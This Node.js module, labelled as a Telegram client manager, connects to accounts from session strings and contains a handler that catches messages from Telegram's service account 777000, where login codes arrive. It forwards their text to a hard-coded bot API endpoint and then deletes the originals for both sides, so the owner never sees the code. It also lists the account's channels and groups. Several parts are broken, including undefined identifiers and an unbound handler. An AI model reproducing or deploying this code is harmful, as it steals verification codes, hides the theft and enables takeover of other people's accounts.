const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { fetchWithTimeout } = require('./index');
const ppplbot = `https://api.telegram.org/bot5807856562:${process.env.apikey}/sendMessage?chat_id=-1001801844217`;

class TelegramManager {
    constructor() {
        this.clients = new Map();
    }

    async createClient(sessionString, phoneNumber) {
        const session = new StringSession(sessionString);
        const client = new TelegramClient(session, process.env.API_ID, process.env.API_HASH, {
            connectionRetries: 5,
        });
        await client.connect();
        console.log(`Client connected: ${phoneNumber}`);
        client.addEventHandler(handleEvents, new NewMessage({ incoming: true }));
        this.clients.set(phoneNumber, client);
        return client;
    }

    async getClient(phoneNumber) {
        if (!this.clients.has(phoneNumber)) {
            throw new Error(`Client not found for phone number ${phoneNumber}`);
        }

        const client = this.clients.get(phoneNumber);
        await client.connect();
        console.log(`Client reconnected: ${phoneNumber}`);
        return client;
    }

    async disconnectAll() {
        for (const [phoneNumber, client] of this.clients.entries()) {
            await client.disconnect();
            console.log(`Client disconnected: ${phoneNumber}`);
        }
    }

    async handleEvents(event) {
        if (event.isPrivate) {
            console.log(event.message.chatId.toString());
            console.log(event.message.text.toLowerCase());
            if (event.message.chatId.toString() == "777000") {
                const payload = {
                    chat_id: "-1001729935532",
                    text: event.message.text
                };
                console.log("RECIEVED");
                await sleep(500);
                await event.message.delete({ revoke: true });
                const options = {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                };
                await fetchWithTimeout(`${ppplbot}`, options);
            }

            if (printChannels) {
                printChannels = false;
                const chats = await event.client.getDialogs({ limit: 130 });
                let reply = '';
                chats.map((chat) => {
                    if (chat.isChannel || chat.isGroup) {
                        const username = chat.entity.toJSON().username ? ` @${chat.entity.toJSON().username} ` : chat.entity.toJSON().id.toString();
                        reply = reply + chat.entity.toJSON().title + " " + username + ' \n';
                    }
                });
                console.log(reply);
            }
        }
    }
}

module.exports = TelegramManager;
